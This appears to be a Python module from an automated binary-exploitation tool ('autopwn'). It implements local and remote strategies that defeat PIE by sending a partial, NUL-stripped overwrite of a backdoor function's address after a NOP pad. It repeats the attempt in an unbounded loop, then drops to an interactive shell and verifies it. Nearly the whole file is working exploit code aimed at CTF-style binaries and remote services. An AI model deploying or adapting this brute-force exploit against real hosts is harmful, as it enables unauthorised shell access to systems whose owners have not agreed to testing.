"""P7.9: PIE + backdoor brute-force strategies (local + remote).

Replaces the v3.1 monolith's ``pie_backdoor_exploit`` (L1442-1475,
local) + ``pie_backdoor_exploit_remote`` (L1477-1511, remote)
ad-hoc brute-force loops with two :class:`ExploitStrategy`
subclasses.

Why PIE backdoor is special
---------------------------
PIE binaries randomize their load base on every execution,
so a hard-coded ``ret2system`` address won't work.  But
**the low bytes of the address are constant** across runs
(only the high bytes change with PIE base).  v3.1's trick:
1. Build ``p64(backdoor_addr)`` (= ``backdoor`` symbol + 0x04
   prologue skip, x86 ``push ebp``).
2. Strip the embedded NULs (``replace(b'\\x00', b'')``).
3. Send the remaining low bytes as payload.  ``read()`` and
   similar C-string input functions stop at the first NUL
   *receiver-side*, so we have to be NUL-free.  But the
   *constant* low bytes match the runtime address modulo
   page offset.
4. Brute force: spawn the binary (PIE re-randomizes), send
   the payload, wait for any response (success = binary
   executes ``backdoor`` function and prints something).
5. PIE base is 4KB-aligned → low 12 bits of the address
   are constant.  With 1 byte of NUL-stripping we only
   send 5–6 bytes; brute-force succeeds within ~1–100
   attempts on average.

This is fundamentally a **brute-force** strategy, not a
single-shot.  v3.1 has no upper bound on attempts (infinite
``while True``); P7.9 inherits this and only escapes via
``EXPLOITATION SUCCESSFUL`` → ``io.interactive()``.

Payload shape (from P6.8 primitive)::

    [asm('nop') * padding] [cleaned_backdoor_bytes]

Per ``rebuild.md`` §6.8 P7.9 + ``refactor.md`` §3.2.2 +
P6.8 primitive contract.

Why pie-arch-unified (2 strategies, not 4)
-------------------------------------------
P6.8 ``PieBackdoor.build_payload`` always returns ``p64(...)``
regardless of bit-width.  Reason: for x32 PIE, the address
fits in 4 bytes; ``p64`` packs it as 8 bytes with 4 leading
NULs that are then stripped.  The end result after NUL-strip
is **identical** to ``p32(...)[:4]`` with NUL-strip, so
``p64`` is bit-width-agnostic for this primitive.  We
therefore emit 2 strategies (local+remote), not 4.
"""
from __future__ import annotations

import datetime

from autopwn.exp.base import ExploitStrategy
from autopwn.exp.registry import register
from autopwn.exp.priorities import PIE_BACKDOOR
from autopwn.primitives.pie_backdoor import PieBackdoor
from autopwn.report.model import ExploitInfo
from autopwn.core.shell_verify import verify_shell


# ---------------------------------------------------------------------------
# Common helper
# ---------------------------------------------------------------------------


def _run_brute_force(ctx, *, use_remote: bool) -> bool:
    """Shared PIE backdoor brute-force loop for local + remote variants.

    Mirrors v3.1's ``pie_backdoor_exploit[_remote]`` infinite ``while
    True`` loop, but with three additions for the v4.0 spec:
      1. 1-stage primitive call (``PieBackdoor.build_payload``)
         to generate the payload, then loop the brute force.
      2. Graceful skip on empty primitive (no PIE, no backdoor,
         padding <= 0) — returns ``False`` without spawning
         processes, so the orchestrator can move to the next
         candidate strategy.
      3. Build an :class:`ExploitInfo` + call
         :func:`record_success` on success (v3.1's
         ``print_critical('EXPLOITATION SUCCESSFUL...')`` had
         no ExploitInfo; P7.9 wires this up for the
         P3.4 report orchestrator).
    """
    from autopwn.report import record_success
    from autopwn.core.logging import print_critical, print_info, print_payload, print_section_header, print_success, print_warning

    label = "Remote" if use_remote else "Local"
    print_section_header(f"EXPLOITATION: PIE Backdoor - {label}")
    print_payload("preparing PIE backdoor brute force")

    primitive = PieBackdoor()
    payload = primitive.build_payload(ctx)
    if not payload:
        print_info("pie-backdoor primitive returned empty; skipping")
        return False

    # Lazy pwnlib import (per P7.3 pattern).
    from pwn import process, remote

    factory = remote if use_remote else process
    # For remote, we need the host/port; for local, we need the path.
    if use_remote:
        if not ctx.remote:
            print_info("pie-backdoor remote: ctx.remote is None; skipping")
            return False
        host, port = ctx.remote
        # v3.1 prints the URL:port banner before the loop starts
        # (only for the remote variant).
        print_info(f"starting PIE brute force attack against {host}:{port}")

    count = 1
    while True:
        try:
            io = factory(host, port) if use_remote else factory(str(ctx.binary.path))
        except Exception as e:
            print_info(f"pie-backdoor spawn failed: {e}")
            return False
        try:
            count += 1
            print_info(f"attempt {count}", prefix="[BRUTE]")
            io.recv()
            io.send(payload)
            io.recv(timeout=10)
        except Exception:
            # v3.1 catches everything; keep parity.
            try:
                io.close()
            except Exception:
                pass
            continue
        else:
            # Success — record + interactive (v3.1 parity).
            info = ExploitInfo(
                exploit_type=f"PIE Backdoor - {label}",
                payload=payload,
                padding=ctx.padding,
                addresses={
                    "backdoor": _extract_backdoor_addr(ctx),
                },
                vulnerability_type="PIE Bypass via backdoor function",
                architecture=("x64" if ctx.binary.bit == 64 else "x32"),
                target_binary=ctx.binary.path.name,
                timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            )
            record_success(info)
            print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
            id_ok, id_output = verify_shell(io)
            if not id_ok:
                print_warning(f"PieBackdoorLocalStrategy: shell verification failed (no uid= output)")
                return False
            ctx.id_output = id_output
            return True


def _extract_backdoor_addr(ctx) -> str:
    """Look up the actual backdoor / callsystem address (for ExploitInfo).

    v3.1 added ``0x04`` to the symbol address to skip the prologue.
    P6.8 ``_lookup_backdoor_addr`` does the same; we call it
    directly so the recorded address matches the brute-force
    target.  Falls back to ``0x0`` if the symbol is missing
    (e.g. ``ctx.binary`` doesn't expose it).
    """
    from autopwn.primitives.pie_backdoor import _lookup_backdoor_addr

    addr = _lookup_backdoor_addr(ctx)
    if addr is None:
        return "0x0"
    return hex(addr)


# ---------------------------------------------------------------------------
# Local strategy
# ---------------------------------------------------------------------------


@register
class PieBackdoorLocalStrategy(ExploitStrategy):
    """PIE + backdoor brute force — local spawn (priority 180)."""

    name = "pie-backdoor"
    priority = PIE_BACKDOOR  # 180
    requires_arch = None  # bit-width-agnostic (see module docstring WHY)
    requires_remote = False
    requires = ()  # primitive checks ctx.binary.pie / has_backdoor / has_callsystem / padding>0

    def matches(self, ctx) -> bool:
        """Match when arch/remote + ctx.binary.pie + (has_backdoor ∨ has_callsystem) + padding>0.

        Mirrors v3.1's main() pie_backdoor gate: PIE=1 AND
        (backdoor symbol exists OR callsystem symbol exists)
        AND padding > 0 (need a BOF offset to slide nop sled).
        We can't express this with ``requires_*`` metadata
        alone (which only checks arch/remote + scalar ctx
        attrs), so we override ``matches()`` like P7.6/P7.8.
        """
        if not super().matches(ctx):
            return False
        if not ctx.binary.pie:
            return False
        if not (ctx.has_backdoor or ctx.has_callsystem):
            return False
        if ctx.padding <= 0:
            return False
        return True

    def run(self, ctx) -> bool:
        """Execute the local PIE backdoor brute force."""
        return _run_brute_force(ctx, use_remote=False)


# ---------------------------------------------------------------------------
# Remote strategy
# ---------------------------------------------------------------------------


@register
class PieBackdoorRemoteStrategy(ExploitStrategy):
    """PIE + backdoor brute force — remote (priority 180)."""

    name = "pie-backdoor-remote"
    priority = PIE_BACKDOOR  # 180
    requires_arch = None
    requires_remote = True
    requires = ()

    def matches(self, ctx) -> bool:
        """Same gate as local, plus ctx.remote must be set."""
        if not super().matches(ctx):
            return False
        if not ctx.binary.pie:
            return False
        if not (ctx.has_backdoor or ctx.has_callsystem):
            return False
        if ctx.padding <= 0:
            return False
        if not ctx.remote:
            return False
        return True

    def run(self, ctx) -> bool:
        """Execute the remote PIE backdoor brute force."""
        return _run_brute_force(ctx, use_remote=True)


__all__ = [
    "PieBackdoorLocalStrategy",
    "PieBackdoorRemoteStrategy",
]
